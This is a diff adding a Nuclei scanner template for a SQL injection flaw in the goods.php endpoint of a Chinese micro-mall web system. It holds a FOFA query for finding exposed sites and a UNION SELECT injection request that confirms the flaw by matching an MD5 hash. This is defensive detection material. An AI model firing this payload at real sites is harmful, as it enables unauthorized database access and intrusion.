@@ -1,0 +1,35 @@
+id: weishangcheng-goods_php-sql
+
+info:
+  name: "微商城系统 goods.php 接口存在 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/Mao_Public/js/jquery-2.1.1.min.js"
+      微商城系统 goods.php 接口存在SQL注入安全缺陷，攻击者可通过构造恶意SQL查询实现对数据库的未授权访问。该漏洞允许攻击者获取存储在数据库中的敏感信息（包括但不限于管理员后台凭证、用户个人信息等），在具备特定权限条件下，攻击者可进一步通过数据库写入操作将恶意代码植入服务器，最终可能获得对目标系统的完全控制权。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486641&idx=1&sn=642495eafd7108878e12e5d9b8e242f9&chksm=c267b982f51030946dd604381cffc2dc8c44e15dbb8f302eb9521151c9891878fdc0bb3d79f7&token=522460222&lang=zh_CN#rd
+  tags: 微商城系统
+
+
+http:
+- raw:
+  - |
+    GET /goods.php?id='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(MD5(123456)+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'e10adc3949ba59abbe56e057f20f883e'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
